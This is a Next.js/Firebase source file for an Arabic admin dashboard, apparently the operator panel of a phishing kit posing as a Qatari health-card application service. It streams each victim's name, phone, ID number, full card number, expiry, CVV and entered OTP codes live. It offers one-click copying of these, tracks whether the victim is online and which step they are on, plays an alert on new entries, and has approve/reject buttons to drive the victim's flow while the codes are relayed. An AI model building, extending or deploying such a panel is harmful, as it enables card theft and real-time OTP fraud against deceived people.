'use client'

import { useEffect, useMemo, useRef, useState } from 'react'
import { useRouter } from 'next/navigation'
import { onAuthStateChanged, signOut, User } from 'firebase/auth'
import { auth, db } from '@/lib/firebase'
import { arrayUnion, collection, onSnapshot, doc, updateDoc, query } from 'firebase/firestore'
import { Card, CardContent, CardHeader, CardTitle } from '@/app/components/ui/card'
import { Button } from '@/app/components/ui/button'
import {
  CheckCircle, XCircle, Clock, User as UserIcon,
  Phone, Shield, RefreshCw, LogOut, Wifi, Copy, Check
} from 'lucide-react'

interface Submission {
  id: string
  name: string
  phone: string
  cardNumber: string
  dateMonth: string
  datayaer: string
  CVC: string
  otpArr: string[]
  cardState: CardStateValue
  method?: string
  createdAt?: number
  stateUpdatedAt?: number
  step?: number
  currentPage?: string
  onlineStatus?: 'online' | 'offline'
  lastSeenAt?: number
  cardStateHistory?: CardStateHistoryEntry[]
}

type CardStateValue = 'pending' | 'approved' | 'rejected'

type CardStateHistoryEntry = {
  state: CardStateValue
  at?: number
  by?: string
}

const PAGE_LABELS: Record<string, string> = {
  'card-information': 'معلومات البطاقة',
  'application-form': 'استمارة التقديم',
  'payment-details': 'تفاصيل الدفع',
  'payment-method': 'اختيار طريقة الدفع',
  'card-info': 'معلومات البطاقة البنكية',
  otp: 'رمز التحقق',
  completed: 'مكتمل',
}

const STEP_LABELS: Record<number, string> = {
  1: 'معلومات البطاقة',
  2: 'استمارة التقديم',
  3: 'تفاصيل الدفع',
  4: 'اختيار طريقة الدفع',
  5: 'معلومات البطاقة البنكية',
  6: 'رمز التحقق',
}

const PRESENCE_TIMEOUT_MS = 45000

function resolveStepLabel(step?: number, currentPage?: string) {
  const pageLabel = currentPage ? PAGE_LABELS[currentPage] : undefined
  if (typeof step === 'number') {
    return `الخطوة ${step}: ${pageLabel ?? STEP_LABELS[step] ?? 'غير محددة'}`
  }
  return pageLabel ?? 'غير محددة'
}

function isSubmissionOnline(sub: Submission, nowTimestamp: number) {
  if (sub.onlineStatus === 'offline') return false
  if (typeof sub.lastSeenAt === 'number') {
    return nowTimestamp - sub.lastSeenAt <= PRESENCE_TIMEOUT_MS
  }
  return sub.onlineStatus === 'online'
}

function cardStateText(state: CardStateValue) {
  if (state === 'approved') return 'مقبول'
  if (state === 'rejected') return 'مرفوض'
  return 'قيد المراجعة'
}

function cardStatePillClass(state: CardStateValue) {
  if (state === 'approved') return 'bg-green-100 text-green-800 border border-green-200'
  if (state === 'rejected') return 'bg-red-100 text-red-800 border border-red-200'
  return 'bg-yellow-100 text-yellow-800 border border-yellow-200'
}

function getCardStateHistory(sub: Submission): CardStateHistoryEntry[] {
  const raw = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory : []
  const normalized = raw
    .filter((entry): entry is CardStateHistoryEntry => !!entry && !!entry.state)
    .map((entry) => ({
      state: entry.state,
      at: typeof entry.at === 'number' ? entry.at : sub.stateUpdatedAt ?? sub.createdAt ?? 0,
      by: entry.by,
    }))
    .sort((a, b) => (b.at ?? 0) - (a.at ?? 0))

  if (normalized.length > 0) return normalized

  if (sub.cardState === 'approved' || sub.cardState === 'rejected') {
    return [{
      state: sub.cardState,
      at: sub.stateUpdatedAt ?? sub.createdAt ?? 0,
      by: undefined,
    }]
  }

  return []
}

function buildNotificationSignature(sub: Submission) {
  const otpCount = Array.isArray(sub.otpArr) ? sub.otpArr.filter(Boolean).length : 0
  const historyCount = Array.isArray(sub.cardStateHistory) ? sub.cardStateHistory.length : 0
  return [
    sub.cardState ?? 'pending',
    sub.step ?? '-',
    sub.currentPage ?? '-',
    sub.onlineStatus ?? '-',
    otpCount,
    historyCount,
  ].join('|')
}

function playDashboardNotificationSound() {
  if (typeof window === 'undefined') return
  const webkitAudioContext = (window as Window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext
  const AudioContextClass = window.AudioContext ?? webkitAudioContext
  if (!AudioContextClass) return

  try {
    const audioContext = new AudioContextClass()
    const gainNode = audioContext.createGain()
    gainNode.connect(audioContext.destination)
    gainNode.gain.setValueAtTime(0.0001, audioContext.currentTime)
    gainNode.gain.exponentialRampToValueAtTime(0.045, audioContext.currentTime + 0.01)
    gainNode.gain.exponentialRampToValueAtTime(0.0001, audioContext.currentTime + 0.35)

    const toneA = audioContext.createOscillator()
    toneA.type = 'sine'
    toneA.frequency.setValueAtTime(932, audioContext.currentTime)
    toneA.connect(gainNode)
    toneA.start(audioContext.currentTime)
    toneA.stop(audioContext.currentTime + 0.12)

    const toneB = audioContext.createOscillator()
    toneB.type = 'sine'
    toneB.frequency.setValueAtTime(1175, audioContext.currentTime + 0.16)
    toneB.connect(gainNode)
    toneB.start(audioContext.currentTime + 0.16)
    toneB.stop(audioContext.currentTime + 0.32)

    setTimeout(() => { void audioContext.close() }, 500)
  } catch (error) {
    console.error(error)
  }
}

function formatCardDisplay(num: string) {
  if (!num) return '•••• •••• •••• ••••'
  const clean = num.replace(/\D/g, '')
  return clean.replace(/(.{4})/g, '$1 ').trim()
}

function CardMockup({ sub }: { sub: Submission }) {
  const isVisa = !sub.method || sub.method === 'visa'
  const approved = sub.cardState === 'approved'
  const rejected = sub.cardState === 'rejected'

  const bgGradient = approved
    ? 'from-emerald-700 via-emerald-600 to-teal-500'
    : rejected
    ? 'from-gray-700 via-gray-600 to-gray-500'
    : 'from-[#1a1a2e] via-[#16213e] to-[#0f3460]'

  return (
    <div className={`relative w-full max-w-[340px] mx-auto rounded-2xl bg-gradient-to-br ${bgGradient} p-5 text-white shadow-2xl overflow-hidden select-none`}
      style={{ aspectRatio: '1.586' }}>
      <div className="absolute inset-0 opacity-10">
        <div className="absolute -top-10 -right-10 w-48 h-48 rounded-full bg-white" />
        <div className="absolute -bottom-16 -left-8 w-56 h-56 rounded-full bg-white" />
      </div>

      <div className="relative flex flex-col h-full justify-between">
        <div className="flex items-start justify-between">
          <div>
            <div className="text-[10px] text-white/60 uppercase tracking-widest">بطاقة مصرفية</div>
            <div className="text-xs font-semibold mt-0.5 opacity-80">
              {approved ? '✓ مقبولة' : rejected ? '✗ مرفوضة' : '◌ قيد المراجعة'}
            </div>
          </div>
          <Wifi className="w-6 h-6 opacity-60 rotate-90" />
        </div>

        <div>
          <div className="w-10 h-7 rounded bg-gradient-to-br from-yellow-300 to-yellow-500 mb-4 opacity-90" />
          <div className="font-mono text-lg tracking-widest font-bold text-center" dir="ltr">
            {formatCardDisplay(sub.cardNumber)}
          </div>
        </div>

        <div className="flex items-end justify-between">
          <div>
            <div className="text-[9px] text-white/50 uppercase tracking-widest mb-0.5">Card Holder</div>
            <div className="text-sm font-semibold truncate max-w-[160px]">{sub.name || '—'}</div>
          </div>
          <div className="text-center">
            <div className="text-[9px] text-white/50 uppercase tracking-widest mb-0.5">Expires</div>
            <div className="text-sm font-mono font-semibold" dir="ltr">
              {sub.dateMonth && sub.datayaer ? `${sub.dateMonth}/${sub.datayaer}` : '••/••'}
            </div>
          </div>
          <div>
            {isVisa ? (
              <img src="/R.png" alt="Visa" className="h-7 w-auto brightness-200 contrast-0 invert" />
            ) : (
              <img src="/m.png" alt="Mastercard" className="h-7 w-auto" />
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  const copy = () => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true)
      setTimeout(() => setCopied(false), 1500)
    })
  }
  return (
    <button onClick={copy} className="ml-2 text-gray-400 hover:text-gray-600 transition-colors" title="نسخ">
      {copied ? <Check className="w-3.5 h-3.5 text-green-500" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  )
}

function InfoRow({ label, value, mono = false, copyable = false }: { label: string; value: string; mono?: boolean; copyable?: boolean }) {
  return (
    <div className="flex flex-col gap-0.5">
      <span className="text-[11px] text-gray-400 font-medium">{label}</span>
      <div className="flex items-center">
        <span className={`text-sm font-semibold text-gray-900 ${mono ? 'font-mono' : ''}`} dir="ltr">
          {value || '—'}
        </span>
        {copyable && value && <CopyButton text={value} />}
      </div>
    </div>
  )
}

export default function Dashboard() {
  const router = useRouter()
  const [user, setUser] = useState<User | null>(null)
  const [authLoading, setAuthLoading] = useState(true)
  const [submissions, setSubmissions] = useState<Submission[]>([])
  const [dataLoading, setDataLoading] = useState(true)
  const [updating, setUpdating] = useState<string | null>(null)
  const [isOnline, setIsOnline] = useState(true)
  const [presenceNow, setPresenceNow] = useState(() => Date.now())
  const [streamStatus, setStreamStatus] = useState<'connecting' | 'live' | 'error'>('connecting')
  const hasLoadedOnceRef = useRef(false)
  const previousSubmissionSignaturesRef = useRef<Map<string, string>>(new Map())

  useEffect(() => {
    const syncOnlineStatus = () => setIsOnline(navigator.onLine)
    syncOnlineStatus()
    window.addEventListener('online', syncOnlineStatus)
    window.addEventListener('offline', syncOnlineStatus)
    return () => {
      window.removeEventListener('online', syncOnlineStatus)
      window.removeEventListener('offline', syncOnlineStatus)
    }
  }, [])

  useEffect(() => {
    const timerId = window.setInterval(() => setPresenceNow(Date.now()), 10000)
    return () => {
      window.clearInterval(timerId)
    }
  }, [])

  useEffect(() => {
    const unsub = onAuthStateChanged(auth, (u) => {
      if (u) { setUser(u) } else { router.replace('/login') }
      setAuthLoading(false)
    })
    return () => unsub()
  }, [router])

  useEffect(() => {
    if (!user) return
    setStreamStatus('connecting')
    const unsub = onSnapshot(query(collection(db, 'pays')), (snap) => {
      const data = snap.docs.map(d => ({ id: d.id, ...d.data() })) as Submission[]
      data.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0))

      const incomingSignatures = new Map<string, string>()
      for (const item of data) {
        incomingSignatures.set(item.id, buildNotificationSignature(item))
      }

      if (hasLoadedOnceRef.current) {
        const hasMeaningfulChange = data.some(item => {
          const previousSignature = previousSubmissionSignaturesRef.current.get(item.id)
          const currentSignature = incomingSignatures.get(item.id)
          return !previousSignature || previousSignature !== currentSignature
        })
        if (hasMeaningfulChange) playDashboardNotificationSound()
      } else {
        hasLoadedOnceRef.current = true
      }
      previousSubmissionSignaturesRef.current = incomingSignatures

      setSubmissions(data)
      setDataLoading(false)
      setStreamStatus('live')
    }, (err) => {
      console.error(err)
      setDataLoading(false)
      setStreamStatus('error')
    })
    return () => unsub()
  }, [user])

  const handleLogout = async () => { await signOut(auth); router.replace('/login') }

  const updateState = async (id: string, state: 'approved' | 'rejected') => {
    setUpdating(id)
    try {
      const now = Date.now()
      await updateDoc(doc(db, 'pays', id), {
        cardState: state,
        stateUpdatedAt: now,
        cardStateHistory: arrayUnion({
          state,
          at: now,
          by: user?.email ?? 'admin',
        }),
      })
    } catch (e) { console.error(e) }
    setUpdating(null)
  }

  const stats = {
    total: submissions.length,
    onlineUsers: submissions.filter(s => isSubmissionOnline(s, presenceNow)).length,
    pending: submissions.filter(s => !s.cardState || s.cardState === 'pending').length,
    approved: submissions.filter(s => s.cardState === 'approved').length,
    rejected: submissions.filter(s => s.cardState === 'rejected').length,
  }

  const rejectedCardHistory = useMemo(
    () => submissions
      .flatMap((sub) => (
        getCardStateHistory(sub)
          .filter(entry => entry.state === 'rejected')
          .map(entry => ({
            id: sub.id,
            at: entry.at ?? sub.stateUpdatedAt ?? sub.createdAt,
            by: entry.by,
          }))
      ))
      .sort((a, b) => (b.at ?? 0) - (a.at ?? 0)),
    [submissions],
  )

  const stateBadge = (s?: string) => {
    if (s === 'approved') return { label: 'مقبول', cls: 'bg-green-100 text-green-800 border border-green-200' }
    if (s === 'rejected') return { label: 'مرفوض', cls: 'bg-red-100 text-red-800 border border-red-200' }
    return { label: 'قيد المراجعة', cls: 'bg-yellow-100 text-yellow-800 border border-yellow-200' }
  }

  const streamStatusView = streamStatus === 'live'
    ? { label: 'المزامنة مباشرة', cls: 'bg-emerald-500/20 text-emerald-100 border border-emerald-300/40' }
    : streamStatus === 'error'
      ? { label: 'خطأ في المزامنة', cls: 'bg-red-500/20 text-red-100 border border-red-300/40' }
      : { label: 'جاري الاتصال...', cls: 'bg-amber-500/20 text-amber-100 border border-amber-300/40' }

  if (authLoading) return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50">
      <div className="text-center">
        <RefreshCw className="w-10 h-10 animate-spin text-[#8A1538] mx-auto mb-3" />
        <p className="text-gray-500 text-sm">جاري التحقق من الجلسة...</p>
      </div>
    </div>
  )

  if (!user) return null

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl">
      <div className="bg-[#8A1538] text-white py-4 px-4 shadow-lg">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h1 className="text-lg font-bold">لوحة التحكم</h1>
            <p className="text-white/60 text-xs">إدارة طلبات البطاقة الصحية — مباشر</p>
          </div>
          <div className="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-start">
            <span className={`inline-flex items-center gap-1.5 rounded-full px-2 py-1 text-[10px] font-semibold ${isOnline ? 'bg-emerald-500/20 text-emerald-100 border border-emerald-300/40' : 'bg-red-500/20 text-red-100 border border-red-300/40'}`}>
              <span className={`h-1.5 w-1.5 rounded-full ${isOnline ? 'bg-emerald-300' : 'bg-red-300'}`} />
              {isOnline ? 'متصل بالإنترنت' : 'غير متصل'}
            </span>
            <span className={`inline-flex items-center gap-1.5 rounded-full px-2 py-1 text-[10px] font-semibold ${streamStatusView.cls}`}>
              <span className="h-1.5 w-1.5 rounded-full bg-current opacity-80" />
              {streamStatusView.label}
            </span>
            <span className="hidden sm:block text-xs text-white/70">{user.email}</span>
            <Button onClick={handleLogout} size="sm" variant="outline"
              className="border-white/30 text-white bg-white/10 hover:bg-white/20 gap-1.5 text-xs">
              <LogOut className="w-3.5 h-3.5" />خروج
            </Button>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-6 space-y-6">
        <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
          {[
            { label: 'إجمالي', value: stats.total, icon: UserIcon, cls: 'bg-blue-50 text-blue-700' },
            { label: 'متصل الآن', value: stats.onlineUsers, icon: Wifi, cls: 'bg-emerald-50 text-emerald-700' },
            { label: 'قيد المراجعة', value: stats.pending, icon: Clock, cls: 'bg-yellow-50 text-yellow-700' },
            { label: 'مقبول', value: stats.approved, icon: CheckCircle, cls: 'bg-green-50 text-green-700' },
            { label: 'مرفوض', value: stats.rejected, icon: XCircle, cls: 'bg-red-50 text-red-700' },
          ].map((s, i) => (
            <Card key={i} className="border-0 shadow-sm bg-white">
              <CardContent className="p-4 flex items-center gap-3">
                <div className={`p-2 rounded-xl ${s.cls}`}><s.icon className="w-5 h-5" /></div>
                <div>
                  <div className="text-2xl font-bold text-gray-900">{s.value}</div>
                  <div className="text-xs text-gray-500">{s.label}</div>
                </div>
              </CardContent>
            </Card>
          ))}
        </div>

        {!dataLoading && rejectedCardHistory.length > 0 && (
          <Card className="border-0 shadow-sm bg-white">
            <CardHeader className="pb-3">
              <CardTitle className="text-base">سجل البطاقات المرفوضة (حسب رقم الهوية)</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2 max-h-60 overflow-auto pr-1">
                {rejectedCardHistory.map((entry, i) => (
                  <div key={`${entry.id}-${entry.at ?? 'na'}-${i}`} className="flex flex-col sm:flex-row sm:items-center justify-between gap-1 rounded-lg border border-red-100 bg-red-50/50 px-3 py-2">
                    <div className="text-sm text-gray-700">
                      رقم الهوية: <span className="font-mono font-semibold">{entry.id}</span>
                    </div>
                    <div className="text-xs text-gray-500 flex items-center gap-2">
                      <span>
                        {entry.at
                          ? new Date(entry.at).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })
                          : '—'}
                      </span>
                      {entry.by && <span className="text-gray-400">({entry.by})</span>}
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}

        {dataLoading ? (
          <div className="py-20 text-center">
            <RefreshCw className="w-8 h-8 animate-spin text-[#8A1538] mx-auto mb-3" />
            <p className="text-gray-500 text-sm">جاري تحميل البيانات...</p>
          </div>
        ) : submissions.length === 0 ? (
          <div className="py-20 text-center text-gray-400">
            <Shield className="w-14 h-14 mx-auto mb-3 opacity-20" />
            <p className="font-medium">لا توجد طلبات بعد</p>
          </div>
        ) : (
          <div className="space-y-5">
            {submissions.map((sub) => {
              const { label, cls } = stateBadge(sub.cardState)
              const isUpdating = updating === sub.id
              const isPending = !sub.cardState || sub.cardState === 'pending'
              const online = isSubmissionOnline(sub, presenceNow)
              const stepLabel = resolveStepLabel(sub.step, sub.currentPage)
              const stateHistory = getCardStateHistory(sub)
              const fullCard = (sub.cardNumber || '').replace(/\D/g, '')
              const groupedCard = fullCard.replace(/(.{4})/g, '$1 ').trim()

              return (
                <div key={sub.id} className="bg-white rounded-2xl shadow-sm overflow-hidden border border-gray-100">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 px-5 py-3 border-b border-gray-100 bg-gray-50/60">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className={`px-2.5 py-1 rounded-full text-xs font-semibold ${cls}`}>{label}</span>
                      <span className={`inline-flex items-center gap-1 rounded-full px-2.5 py-1 text-xs font-semibold border ${
                        online
                          ? 'bg-emerald-100 text-emerald-800 border-emerald-200'
                          : 'bg-gray-100 text-gray-700 border-gray-200'
                      }`}>
                        <span className={`h-1.5 w-1.5 rounded-full ${online ? 'bg-emerald-500' : 'bg-gray-400'}`} />
                        {online ? 'متصل الآن' : 'غير متصل'}
                      </span>
                      <span className="px-2.5 py-1 rounded-full text-xs font-semibold bg-slate-100 text-slate-700 border border-slate-200">
                        {stepLabel}
                      </span>
                      <span className="text-xs text-gray-400">رقم الهوية: <span className="font-mono font-semibold text-gray-700">{sub.id}</span></span>
                    </div>
                    {sub.createdAt && (
                      <span className="text-xs text-gray-400">
                        {new Date(sub.createdAt).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })}
                      </span>
                    )}
                  </div>

                  <div className="p-5">
                    <div className="flex flex-col lg:flex-row gap-6">
                      <div className="lg:w-[340px] flex-shrink-0">
                        <CardMockup sub={sub} />
                        <div className="mt-3 bg-gray-50 rounded-xl p-3 border border-gray-100" dir="ltr">
                          <div className="text-[10px] text-gray-400 mb-1 text-right">رقم البطاقة كاملاً</div>
                          <div className="flex items-center justify-between">
                            <span className="font-mono text-base font-bold text-gray-900 tracking-widest">
                              {groupedCard || '— — — —'}
                            </span>
                            {groupedCard && <CopyButton text={fullCard} />}
                          </div>
                        </div>
                      </div>

                      <div className="flex-1 space-y-5">
                        <div>
                          <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                            <UserIcon className="w-3.5 h-3.5" /> المعلومات الشخصية
                          </h3>
                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
                            <InfoRow label="الاسم الكامل" value={sub.name} />
                            <InfoRow label="رقم الهاتف" value={sub.phone} mono copyable />
                            <InfoRow label="رقم الهوية" value={sub.id} mono copyable />
                            <InfoRow label="طريقة الدفع" value={sub.method === 'mastercard' ? 'Mastercard' : 'Visa'} />
                            <InfoRow label="الخطوة الحالية" value={stepLabel} />
                            <InfoRow
                              label="آخر نشاط"
                              value={sub.lastSeenAt
                                ? new Date(sub.lastSeenAt).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })
                                : '—'}
                            />
                          </div>
                        </div>

                        <div>
                          <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                            <Shield className="w-3.5 h-3.5" /> بيانات البطاقة
                          </h3>
                          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-gray-50 rounded-xl p-4 border border-gray-100">
                            <div className="sm:col-span-2">
                              <InfoRow label="رقم البطاقة" value={groupedCard} mono copyable />
                            </div>
                            <InfoRow label="تاريخ الانتهاء" value={sub.dateMonth && sub.datayaer ? `${sub.dateMonth}/${sub.datayaer}` : '—'} mono />
                            <InfoRow label="CVV" value={sub.CVC} mono copyable />
                          </div>
                        </div>

                        {sub.otpArr && sub.otpArr.filter(Boolean).length > 0 && (
                          <div>
                            <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                              <Phone className="w-3.5 h-3.5" /> رموز التحقق (OTP)
                            </h3>
                            <div className="bg-gray-50 rounded-xl p-4 border border-gray-100">
                              <div className="flex flex-wrap gap-2">
                                {sub.otpArr.filter(Boolean).map((otp, i) => (
                                  <div key={i} className="flex items-center gap-1 bg-white border border-gray-200 rounded-lg px-3 py-1.5 shadow-sm">
                                    <span className="text-[10px] text-gray-400 font-medium">#{i + 1}</span>
                                    <span className="font-mono text-sm font-bold text-gray-900 tracking-widest">{otp}</span>
                                    <CopyButton text={otp} />
                                  </div>
                                ))}
                              </div>
                            </div>
                          </div>
                        )}

                        {stateHistory.length > 0 && (
                          <div>
                            <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider mb-3 flex items-center gap-1.5">
                              <Clock className="w-3.5 h-3.5" /> سجل حالة البطاقة
                            </h3>
                            <div className="bg-gray-50 rounded-xl p-4 border border-gray-100 space-y-2">
                              {stateHistory.map((entry, index) => (
                                <div key={`${entry.state}-${entry.at}-${index}`} className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-1 rounded-lg border border-gray-200 bg-white px-3 py-2">
                                  <span className={`inline-flex w-fit items-center rounded-full px-2.5 py-1 text-xs font-semibold ${cardStatePillClass(entry.state)}`}>
                                    {cardStateText(entry.state)}
                                  </span>
                                  <span className="text-xs text-gray-500">
                                    {entry.at
                                      ? new Date(entry.at).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })
                                      : '—'}
                                  </span>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}

                        {isPending && (
                          <div className="flex flex-col sm:flex-row gap-3 pt-1">
                            <Button
                              disabled={isUpdating}
                              onClick={() => updateState(sub.id, 'approved')}
                              className="flex-1 bg-green-600 hover:bg-green-700 text-white gap-2 h-10"
                            >
                              {isUpdating ? <RefreshCw className="w-4 h-4 animate-spin" /> : <CheckCircle className="w-4 h-4" />}
                              قبول الطلب
                            </Button>
                            <Button
                              disabled={isUpdating}
                              onClick={() => updateState(sub.id, 'rejected')}
                              className="flex-1 bg-red-600 hover:bg-red-700 text-white gap-2 h-10"
                            >
                              {isUpdating ? <RefreshCw className="w-4 h-4 animate-spin" /> : <XCircle className="w-4 h-4" />}
                              رفض الطلب
                            </Button>
                          </div>
                        )}

                        {!isPending && (
                          <div className={`rounded-xl p-3 text-center text-sm font-semibold ${
                            sub.cardState === 'approved'
                              ? 'bg-green-50 text-green-700 border border-green-200'
                              : 'bg-red-50 text-red-700 border border-red-200'
                          }`}>
                            {sub.cardState === 'approved' ? '✓ تم قبول هذا الطلب' : '✗ تم رفض هذا الطلب'}
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              )
            })}
          </div>
        )}
      </div>
    </div>
  )
}
